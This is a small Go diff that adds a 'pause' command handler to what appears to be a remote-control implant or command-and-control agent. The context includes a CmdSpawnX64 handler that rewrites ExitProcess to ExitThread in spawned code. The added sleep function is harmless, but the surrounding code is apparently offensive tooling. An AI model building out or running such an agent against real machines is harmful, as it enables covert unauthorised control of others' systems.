@@ -3,6 +3,7 @@ package services
 import (
 	"bytes"
 	"errors"
+	"fmt"
 	"io"
 	"main/config"
 	"main/crypt"
@@ -110,6 +111,12 @@ func CmdPwd() ([]byte, error) {
 	return packet.GetCurrentDirectory()
 }
 
+func CmdPause(cmdBuf []byte) ([]byte, error) {
+	pauseTime := packet.ReadInt(cmdBuf)
+	fmt.Println(fmt.Sprintf("Pause time: %d", pauseTime))
+	time.Sleep(time.Duration(pauseTime) * time.Millisecond)
+	return []byte(fmt.Sprintf("Pause for %d millisecond", pauseTime)), nil
+}
 func CmdSpawnX64(cmdBuf []byte) ([]byte, error) {
 	cmdString := string(cmdBuf)
 	cmdString = strings.Replace(cmdString, "ExitProcess", "ExitThread"+"\x00", -1)
